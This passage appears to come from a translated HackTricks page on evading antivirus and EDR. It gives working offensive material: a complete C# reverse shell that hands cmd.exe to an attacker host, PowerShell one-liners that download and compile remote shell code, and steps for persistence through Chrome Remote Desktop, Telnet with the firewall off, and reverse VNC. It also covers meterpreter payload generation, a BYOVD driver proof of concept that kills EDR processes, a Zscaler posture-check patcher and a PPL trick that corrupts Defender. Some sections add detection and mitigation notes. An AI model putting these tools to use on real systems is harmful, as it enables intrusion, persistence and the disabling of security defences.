- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korišćenje pouzdanog softvera

### Chrome Remote Desktop

Kao što je opisano u [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je samo deploy-ovati Chrome Remote Desktop na žrtvin PC i onda ga koristiti za takeover i održavanje persistence:
1. Preuzmite sa https://remotedesktop.google.com/, kliknite na "Set up via SSH", zatim kliknite na MSI fajl za Windows da preuzmete MSI.
2. Pokrenite installer silently na žrtvi (potrebna administratorska prava): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop i kliknite next. Wizard će zatim tražiti da autorizujete; kliknite Authorize da nastavite.
4. Pokrenite dati parametar sa nekim prilagođavanjima: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Napomena: parametar pin omogućava postavljanje pina bez korišćenja GUI-ja).

## Advanced Evasion

Evasion je veoma komplikovana tema, ponekad morate uzeti u obzir mnogo različitih izvora telemetrije u samo jednom sistemu, tako da je praktično nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje protiv kojeg idete imaće svoje snage i slabosti.

Toplo vam preporučujem da pogledate ovaj talk od [@ATTL4S](https://twitter.com/DaniLJ94), da steknete uvid u više Advanced Evasion tehnika.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe odličan talk od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare tehnike**

### **Proverite koje delove Defender nalazi kao zlonamerne**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **uklanjati delove binarnog fajla** dok **ne utvrdi koji deo Defender** smatra zlonamernim i podeli vam to.\
Još jedan alat koji radi **isto je** [**avred**](https://github.com/dobin/avred) sa javnom web uslugom dostupnom na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, svi Windows su dolazili sa **Telnet server-om** koji ste mogli instalirati (kao administrator) radeći:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka se **pokrene** pri pokretanju sistema i **pokreni** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promenite telnet port** (stealth) i onemogućite firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim premestite binar _**winvnc.exe**_ i **novo** kreirani fajl _**UltraVNC.ini**_ na **victim**

#### **Reverse connection**

The **attacker** treba da **pokrene unutar** svog **host** binar `vncviewer.exe -listen 5900` tako da bude **pripremljen** da uhvati reverse **VNC connection**. Zatim, unutar **victim**: Pokrenite winvnc daemon `winvnc.exe -run` i izvršite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Da biste ostali neprimećeni ne smete da uradite nekoliko stvari

- Ne pokrećite `winvnc` ako već radi ili ćete pokrenuti [popup](https://i.imgur.com/1SROTTl.png). Proverite da li radi sa `tasklist | findstr winvnc`
- Ne pokrećite `winvnc` bez `UltraVNC.ini` u istom direktorijumu ili će se otvoriti [the config window](https://i.imgur.com/rfMQWcf.png)
- Ne pokrećite `winvnc -h` za pomoć ili ćete pokrenuti [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT-a:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite lister** sa `msfconsole -r file.rc` i **izvršite** **xml payload** sa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni Defender će veoma brzo prekinuti proces.**

### Kompajliranje našeg vlastitog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga sa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# korišćenje kompajlera
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatora za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje Pythona za primer izrade injektora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Onemogućavanje AV/EDR iz kernel prostora

Storm-2603 je iskoristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući zaštitu krajnjih tačaka pre nego što pusti ransomware. Alat donosi svoj **ranjivi ali *potpisani* driver** i zloupotrebljava ga za izvršavanje privilegovanih kernel operacija koje čak ni Protected-Process-Light (PPL) AV servisi ne mogu blokirati.

Ključni zaključci
1. **Signed driver**: Fajl isporučen na disk je `ServiceMouse.sys`, ali binarni fajl je legitimno potpisani driver `AToolsKrnl64.sys` iz Antiy Labs’ “System In-Depth Analysis Toolkit”. Pošto driver nosi validan Microsoft potpis, učitava se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prvi red registruje driver kao **kernel servis**, a drugi ga startuje tako da `\\.\ServiceMouse` postane dostupan iz user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Mogućnost                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminira proizvoljan proces po PID-u (koristi se za gašenje Defender/EDR servisa) |
| `0x990000D0` | Briše proizvoljan fajl na disku |
| `0x990001D0` | Uklanja driver i briše servis |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Zašto radi**: BYOVD u potpunosti zaobilazi zaštite u user-mode; kod koji se izvršava u kernelu može otvoriti *protected* procese, terminirati ih ili menjati kernel objekte bez obzira na PPL/PP, ELAM ili druge mehanizme hardening-a.

Detection / Mitigation
•  Omogućite Microsoft-ovu listu blokiranih ranjivih drajvera (`HVCI`, `Smart App Control`) kako bi Windows odbio da učita `AToolsKrnl64.sys`.  
•  Pratite kreiranje novih *kernel* servisa i alarmirajte kada se driver učitava iz world-writable direktorijuma ili nije na allow-listi.  
•  Pazite na user-mode handle-ove ka custom device objektima praćene sumnjivim `DeviceIoControl` pozivima.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** primenjuje device-posture pravila lokalno i oslanja se na Windows RPC da prenese rezultate drugim komponentama. Dva slaba dizajnerska izbora omogućavaju potpuni bypass:

1. Evaluacija posture-a se dešava **u potpunosti na klijentu** (serveru se šalje samo boolean).
2. Interni RPC endpoint-i proveravaju samo da je povezani izvršni fajl **potpisan od strane Zscaler** (putem `WinVerifyTrust`).

Patchovanjem **četiri potpisana binarna fajla na disku** oba mehanizma mogu biti neutralisana:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1`, pa je svaka provera uspela |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ bilo koji (čak i nepotpisan) proces može da se priključi RPC pipe-ovima |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjena sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Prekinuto |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **Svi** posture checks prikazuju **green/compliant**.
* Nepotpisani ili izmenjeni binarni fajlovi mogu otvoriti named-pipe RPC endpoints (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internal network definisanoj Zscaler politikama.

Ova studija slučaja pokazuje kako odluke o poverenju koje se donose isključivo na strani klijenta i jednostavne provere potpisa mogu biti zaobiđene sa nekoliko izmena bajtova.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) nameće signer/level hijerarhiju tako da samo zaštićeni procesi sa jednakim ili višim nivoom mogu da menjaju jedni druge. Ofanzivno, ako legitimno možete pokrenuti PPL-enabled binarni fajl i kontrolisati njegove argumente, možete pretvoriti benignu funkcionalnost (npr. logging) u ograničeni, PPL-pokriven write primitive prema zaštićenim direktorijumima koje koriste AV/EDR.

Šta je potrebno da proces radi kao PPL
- Ciljani EXE (i svi učitani DLL-ovi) moraju biti potpisani sa PPL-capable EKU.
- Proces mora biti kreiran pomoću CreateProcess koristeći flagove: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Potreban je zahtev za kompatibilnim protection level-om koji odgovara potpisniku binarnog fajla (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za anti-malware potpisnike, `PROTECTION_LEVEL_WINDOWS` za Windows potpisnike). Pogrešni nivoi će dovesti do greške pri kreiranju.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Primer upotrebe:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitiv: ClipUp.exe
- Potpisani sistemski binarni fajl `C:\Windows\System32\ClipUp.exe` sam se pokreće i prihvata parametar za zapisivanje log fajla na putanju koju navede pozivač.
- Kada se pokrene kao PPL proces, upis fajla se izvršava uz PPL podršku.
- ClipUp ne može da parsira putanje sa razmacima; koristite 8.3 kratke putanje da ciljate uobičajeno zaštićene lokacije.

8.3 pomoćnici za kratke putanje
- Navedite kratke nazive: `dir /x` u svakom roditeljskom direktorijumu.
- Dobijte 8.3 kratku putanju u cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Pokrenite LOLBIN koji podržava PPL (ClipUp) koristeći `CREATE_PROTECTED_PROCESS` i launcher (npr. CreateProcessAsPPL).
2) Prosledite ClipUp argument za log-putanju da biste forsirali kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Koristite 8.3 kratke nazive ako je potrebno.
3) Ako je ciljni binarni fajl obično otvoren/zaključan od strane AV dok radi (npr. MsMpEng.exe), rasporedite upis pri boot-u pre nego što AV startuje instaliranjem auto-start servisa koji se pouzdano izvršava ranije. Validirajte redosled boota koristeći Process Monitor (boot logging).
4) Na reboot-u, upis sa PPL podrškom se događa pre nego što AV zaključa svoje binarne fajlove, korumpirajući ciljni fajl i onemogućavajući pokretanje.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Beleške i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp zapisuje izuzev pozicije; primitiv je pogodniji za korupciju nego za precizno injektovanje sadržaja.
- Zahteva privilegije lokalnog admina/SYSTEM za instalaciju/pokretanje servisa i prozor za restart.
- Vreme je kritično: cilj ne sme biti otvoren; izvršavanje pri pokretanju sistema izbegava zaključavanja fajlova.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neobičnim argumentima, naročito ako je parentovan od strane nestandardnih launchera, oko pokretanja sistema.
- Novi servisi konfigurisani da automatski pokreću sumnjive binarije i koji se konzistentno pokreću pre Defender/AV. Istražite kreiranje/izmenu servisa pre neuspeha pri pokretanju Defender-a.
- Monitoring integriteta fajlova na Defender binarijama/Platform direktorijumima; neočekivana kreiranja/izmene fajlova od strane procesa sa protected-process zastavicama.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalno korišćenje nivoa PPL od strane non-AV binarija.

Mitigacije
- WDAC/Code Integrity: ograničite koji potpisani binariji mogu da rade kao PPL i pod kojim parentima; blokirajte pozivanje ClipUp van legitimnih konteksta.
- Higijena servisa: ograničite kreiranje/izmenu auto-start servisa i nadgledajte manipulacije redosledom pokretanja.
- Osigurajte da su Defender tamper protection i early-launch protections uključeni; istražite greške pri startovanju koje ukazuju na korupciju binarija.
- Razmotrite onemogućavanje 8.3 short-name generation na volumenima koji hostuju security tooling ako je kompatibilno sa vašim okruženjem (pažljivo testirajte).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
